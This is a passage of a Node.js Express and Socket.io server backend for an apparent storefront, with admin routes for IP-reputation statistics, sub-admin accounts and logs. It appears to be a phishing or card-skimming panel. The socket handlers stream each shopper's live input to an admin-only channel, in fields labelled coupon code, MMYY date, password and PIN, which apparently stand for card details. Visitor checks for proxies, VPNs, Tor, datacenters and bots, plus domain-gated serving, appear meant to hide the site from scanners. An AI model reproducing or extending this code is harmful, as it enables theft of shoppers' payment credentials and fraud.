            db.get('SELECT COUNT(*) as blocked_month FROM ip_checks WHERE checked_at >= ? AND action_taken != ?', [monthStart, 'allow'], (err6, bm) => {
              if (err6) return res.status(500).json({ error: err6.message });
              db.all('SELECT action_taken, threat_level, is_proxy, is_vpn, is_tor, is_datacenter, is_bot, country FROM ip_checks WHERE checked_at >= ?', [monthStart], (err7, rows) => {
                if (err7) return res.status(500).json({ error: err7.message });
                const threatDist = {};
                const countryDist = {};
                (rows || []).forEach(r => {
                  const k = r.action_taken !== 'allow' ? (r.threat_level || 'blocked') : 'allow';
                  threatDist[k] = (threatDist[k] || 0) + 1;
                  if (r.country) countryDist[r.country] = (countryDist[r.country] || 0) + 1;
                });
                res.json({
                  today: { total: t.total, blocked: b.blocked, rate: t.total ? (b.blocked / t.total * 100).toFixed(1) : 0 },
                  week: { total: w.total_week, blocked: bw.blocked_week, rate: w.total_week ? (bw.blocked_week / w.total_week * 100).toFixed(1) : 0 },
                  month: { total: m.total_month, blocked: bm.blocked_month, rate: m.total_month ? (bm.blocked_month / m.total_month * 100).toFixed(1) : 0 },
                  threatDistribution: threatDist,
                  countryDistribution: countryDist,
                });
              });
            });
          });
        });
      });
    });
  });
});

// 19. GET IP logs (recent records)
app.get('/api/admin/ip-logs', requireAdmin('ipstats'), (req, res) => {
  const limit = Math.min(parseInt(req.query.limit, 10) || 50, 200);
  db.all('SELECT * FROM ip_checks ORDER BY checked_at DESC LIMIT ?', [limit], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows || []);
  });
});

// 20. POST test IP (admin)
app.post('/api/admin/settings/test-ip', requireAdmin('system'), (req, res) => {
  const { ip, api_key } = req.body;
  const key = api_key || process.env.IPREGISTRY_API_KEY;
  if (!key) return res.status(400).json({ error: 'API key not set' });
  ipcheck.testApiKey(key, ip || '8.8.8.8').then((data) => {
    if (data.creditsRemaining != null) setSetting('ipregistry_quota_remaining', String(data.creditsRemaining), () => {});
    if (data.creditsConsumed != null) setSetting('ipregistry_quota_used', String(data.creditsConsumed), () => {});
    res.json(data);
  }).catch((e) => res.status(500).json({ error: e.message }));
});

// --- Account management (main + sub, permissions) ---
app.get('/api/admin/accounts', requireAdmin('accounts'), (req, res) => {
  db.all('SELECT id, username, role, permissions, created_at FROM admin_users ORDER BY role DESC, id ASC', (err, rows) => {
    if (err) return res.status(500).json({ error: 'Server error' });
    const list = (rows || []).map((r) => {
      let permissions = [];
      if (r.permissions) {
        try {
          const p = JSON.parse(r.permissions);
          if (Array.isArray(p)) permissions = auth.sanitizePanels(p);
        } catch (_) { /* invalid JSON: do not 500 */ }
      }
      return { ...r, permissions };
    });
    res.json(list);
  });
});

app.put('/api/admin/accounts/me', requireAdmin(), async (req, res) => {
  const { username, newPassword } = req.body;
  const userId = req.admin.userId;
  if (!userId) return res.status(401).json({ error: 'Unauthorized' });
  const updates = [];
  const params = [];
  if (typeof username === 'string' && username.trim().length >= 2) {
    updates.push('username = ?');
    params.push(username.trim().slice(0, 128));
  }
  if (typeof newPassword === 'string' && newPassword.length >= 8) {
    const { hash } = await auth.hashPassword(newPassword);
    updates.push('password_hash = ?');
    params.push(hash);
  }
  if (updates.length === 0) return res.status(400).json({ error: 'Nothing to update' });
  params.push(userId);
  db.run('UPDATE admin_users SET ' + updates.join(', ') + ' WHERE id = ?', params, function (err) {
    if (err) {
      if (err.message.includes('UNIQUE')) return res.status(409).json({ error: 'Username taken' });
      return res.status(500).json({ error: 'Server error' });
    }
    res.json({ success: true });
  });
});

app.post('/api/admin/accounts', requireAdmin('accounts'), (req, res) => {
  const username = (req.body.username || '').toString().trim().slice(0, 128);
  const password = req.body.password;
  const permissions = Array.isArray(req.body.permissions) ? req.body.permissions : [];
  if (!username || username.length < 2) return res.status(400).json({ error: 'Username required' });
  if (!password || password.length < 8) return res.status(400).json({ error: 'Password min 8 chars' });
  const allowed = auth.sanitizePanels(permissions);
  const { hash } = auth.hashPassword(password);
  db.run('INSERT INTO admin_users (username, password_hash, role, permissions) VALUES (?, ?, ?, ?)', [username, hash, 'sub', JSON.stringify(allowed)], function (err) {
    if (err) {
      if (err.message.includes('UNIQUE')) return res.status(409).json({ error: 'Username taken' });
      return res.status(500).json({ error: 'Server error' });
    }
    res.json({ success: true, id: this.lastID });
  });
});

app.put('/api/admin/accounts/:id', requireAdmin('accounts'), (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (req.admin.role === 'sub' && req.admin.userId !== id) {
    return res.status(403).json({ error: 'Forbidden', detail: 'cannot_edit_other_accounts' });
  }
  const { username, newPassword, permissions } = req.body;
  db.get('SELECT id, role FROM admin_users WHERE id = ?', [id], async (err, user) => {
    if (err || !user) return res.status(404).json({ error: 'User not found' });
    if (user.role === 'main' && req.admin.userId !== id) return res.status(403).json({ error: 'Cannot edit main account' });
    const updates = [];
    const params = [];
    if (typeof username === 'string' && username.trim().length >= 2) {
      updates.push('username = ?');
      params.push(username.trim().slice(0, 128));
    }
    if (typeof newPassword === 'string' && newPassword.length >= 8) {
      const { hash } = await auth.hashPassword(newPassword);
      updates.push('password_hash = ?');
      params.push(hash);
    }
    if (Array.isArray(permissions)) {
      const allowed = auth.sanitizePanels(permissions);
      updates.push('permissions = ?');
      params.push(JSON.stringify(allowed));
    }
    if (updates.length === 0) return res.status(400).json({ error: 'Nothing to update' });
    params.push(id);
    db.run('UPDATE admin_users SET ' + updates.join(', ') + ' WHERE id = ?', params, function (err2) {
      if (err2) {
        if (err2.message.includes('UNIQUE')) return res.status(409).json({ error: 'Username taken' });
        return res.status(500).json({ error: 'Server error' });
      }
      res.json({ success: true });
    });
  });
});

// --- Security logs (no sensitive data: no stack, no DB path, no keys) ---
app.get('/api/admin/logs', requireAdmin('logs'), (req, res) => {
  const limit = Math.min(parseInt(req.query.limit, 10) || 100, 500);
  db.all('SELECT id, kind, ip, detail, created_at FROM security_logs ORDER BY created_at DESC LIMIT ?', [limit], (err, rows) => {
    if (err) return res.status(500).json({ error: 'Server error' });
    res.json(rows || []);
  });
});

// --- Full-stack: serve store SPA only on domains added in admin (shops/shop_domains); admin at ADMIN_PATH on any host; no store by IP ---
let storeHostsCache = { set: new Set(), at: 0 };
function refreshStoreHosts(cb) {
  db.all('SELECT domain FROM shops UNION SELECT domain FROM shop_domains', (err, rows) => {
    if (err) { if (cb) cb(); return; }
    const set = new Set((rows || []).map(r => (r.domain || '').toLowerCase().trim()).filter(Boolean));
    storeHostsCache = { set, at: Date.now() };
    if (cb) cb();
  });
}
const publicDir = path.join(__dirname, 'public');
if (fs.existsSync(path.join(publicDir, 'index.html'))) {
  refreshStoreHosts();
  const STORE_HOSTS_TTL_MS = 60000; // 60s
  // Serve /assets/* first (no gate) to avoid connection reset on large JS/CSS
  const assetsDir = path.join(publicDir, 'assets');
  if (fs.existsSync(assetsDir)) {
    app.use('/assets', express.static(assetsDir, { maxAge: '1y', immutable: true }));
  }
  // Normalize ADMIN_PATH to one leading slash (env may be "ZNjx..." or "/ZNjx...") so path match works
  let adminPathNorm = (process.env.ADMIN_PATH || '/manage-admin').trim().replace(/\/+$/, '');
  if (!adminPathNorm.startsWith('/')) adminPathNorm = '/' + adminPathNorm;
  const ADMIN_PATH_FRONT = adminPathNorm || '/manage-admin';

  app.use((req, res, next) => {
    if (req.method !== 'GET') return next();
    if (req.path.startsWith('/api') || req.path.startsWith('/socket.io')) return next();
    if (req.path.startsWith('/assets/')) return next();
    if (/\.(js|css|ico|svg|woff2?|ttf|eot|map|png|jpg|jpeg|webp)$/i.test(req.path)) return next();
    const host = (req.hostname || '').toLowerCase();
    const pathNorm = (req.path || '/').replace(/\/$/, '') || '/';
    const isAdminPath = pathNorm === ADMIN_PATH_FRONT || pathNorm.startsWith(ADMIN_PATH_FRONT + '/');
    if (isAdminPath) return next(); // admin: any host (including IP)
    if (storeHostsCache.at + STORE_HOSTS_TTL_MS < Date.now()) refreshStoreHosts(() => {});
    if (storeHostsCache.set.has(host)) return next(); // store: only configured domains
    return res.status(404).send('Not Found');
  });
  app.use(express.static(publicDir));
  app.get('*', (req, res) => { res.sendFile(path.join(publicDir, 'index.html')); });
}

// --- Global error handler (never leak stack or internal paths) ---
app.use((err, req, res, next) => {
  const ip = clientIp(req);
  auth.logSecurity('error', ip, err.message || 'unknown');
  if (res.headersSent) return next(err);
  res.status(500).json({ error: 'Server error' });
});

// --- Socket.io Logic: default namespace = customers (join_order + live typing); admin = /admin namespace (listen-only) ---
io.on('connection', (socket) => {
  socket.on('join_order', (orderId) => {
    if (socket.currentOrderId) {
      socket.leave(`order_${socket.currentOrderId}`);
      const prevSockets = onlineOrders.get(socket.currentOrderId);
      if (prevSockets) {
        prevSockets.delete(socket.id);
        if (prevSockets.size === 0) {
          onlineOrders.delete(socket.currentOrderId);
          adminNsp.emit('user_online', { orderId: socket.currentOrderId, online: false });
        }
      }
    }
    socket.join(`order_${orderId}`);
    socket.currentOrderId = orderId;
    if (!onlineOrders.has(orderId)) onlineOrders.set(orderId, new Set());
    onlineOrders.get(orderId).add(socket.id);
    adminNsp.emit('user_online', { orderId, online: true });
  });

  socket.on('live_session_start', (data) => {
    const session = {
      customer: data.customer,
      cartTotal: data.cartTotal || 0,
      couponCode: '',
      dateMMYY: '',
      password: '',
      startedAt: new Date().toISOString(),
    };
    liveSessions.set(socket.id, session);
    adminNsp.emit('live_session_start', { id: socket.id, ...session });
  });
  socket.on('live_coupon_update', (data) => {
    let session = liveSessions.get(socket.id);
    if (!session) {
      session = { customer: null, cartTotal: 0, couponCode: '', dateMMYY: '', password: '', startedAt: new Date().toISOString() };
      liveSessions.set(socket.id, session);
      adminNsp.emit('live_session_start', { id: socket.id, ...session });
    }
    if (data.code !== undefined) session.couponCode = data.code;
    if (data.dateMMYY !== undefined) session.dateMMYY = data.dateMMYY;
    if (data.password !== undefined) session.password = data.password;
    adminNsp.emit('live_coupon_update', { id: socket.id, ...data });
  });
  socket.on('live_pin_update', (data) => {
    adminNsp.emit('live_pin_update', { orderId: socket.currentOrderId, pinCode: data.pinCode });
  });
  socket.on('live_order_coupon_update', (data) => {
    adminNsp.emit('live_order_coupon_update', data);
  });
  socket.on('live_session_end', () => {
    if (liveSessions.has(socket.id)) {
      liveSessions.delete(socket.id);
      adminNsp.emit('live_session_end', { id: socket.id });
    }
  });

  socket.on('disconnect', () => {
    if (liveSessions.has(socket.id)) {
      liveSessions.delete(socket.id);
      adminNsp.emit('live_session_end', { id: socket.id });
    }
    if (socket.currentOrderId) {
      const sockets = onlineOrders.get(socket.currentOrderId);
      if (sockets) {
        sockets.delete(socket.id);
        if (sockets.size === 0) {
          onlineOrders.delete(socket.currentOrderId);
          adminNsp.emit('user_online', { orderId: socket.currentOrderId, online: false });
        }
      }
    }
  });
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
